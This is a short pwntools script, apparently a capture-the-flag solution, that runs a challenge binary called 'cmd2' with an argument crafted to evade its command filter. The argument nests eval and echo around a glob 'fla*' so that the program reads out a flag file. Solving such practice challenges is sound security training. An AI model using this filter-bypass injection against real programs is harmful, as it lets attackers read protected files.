from pwn import *

p = process(['./cmd2', 'eval echo eval "\$(<$(echo fla*))"'])

p.interactive()
